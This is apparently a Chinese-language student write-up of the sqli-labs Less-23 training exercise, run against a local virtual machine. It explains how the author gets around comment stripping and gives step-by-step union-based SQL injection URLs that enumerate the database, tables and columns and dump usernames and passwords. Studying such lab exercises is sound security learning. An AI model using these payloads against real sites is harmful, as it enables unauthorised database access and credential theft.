@@ -1,0 +1,38 @@
+url：http://10.0.2.15/sqli/Less-23/?id=1\
+报错
+
+故推测sql：
+select 字段名 from 表名 where id = '输入的id' limit 0,1;
+
+但当url：http://10.0.2.15/sqli/Less-23/?id=1' --+
+仍旧报错
+根据报错内容（提示多了单引号，但注释符没有显示），我们判断代码中有去注释符的处理机制
+去除注释符会使我们不能呢个成功闭合单引号等，于是可以换一种思路，利用or '1'='1来闭合单引号
+
+1.字段数
+这里字段数不能用order by判断
+比如：
+url：http://10.0.2.15/sqli/Less-23/?id=1' order by 100 and '1' = '1
+仍旧显示正常
+不能这么做的原因我上网上查了一下，有一个说法我比较认同
+where和order by都是子句，and是操作符，用于where子句。在Mysql的执行顺序中，where是远在order by前面的。第二个查询语句中，order by在where的条件中，在where执行时被忽略了，结果集生成后再未执行order by
+但不确定是否是对的，希望日后有机会问问老师
+于是只能用 union select 1,2,3来判断字段数
+http://10.0.2.15/sqli/Less-23/?id=1' union select 1,2,3 or '1' = '1
+正常显示
+http://10.0.2.15/sqli/Less-23/?id=1' union select 1,2,3,4 or '1' = '1
+报错。说明字段数为3
+
+2.数据库名
+http://10.0.2.15/sqli/Less-23/?id=0' union select 1,(select database()),'3
+
+3.表名
+http://10.0.2.15/sqli/Less-23/?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),'3
+
+4.字段名
+http://10.0.2.15/sqli/Less-23/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),'3
+
+5.字段值
+http://10.0.2.15/sqli/Less-23/?id=0' union select 1,(select group_concat(username,0x3a,password) from users),'3
+
+
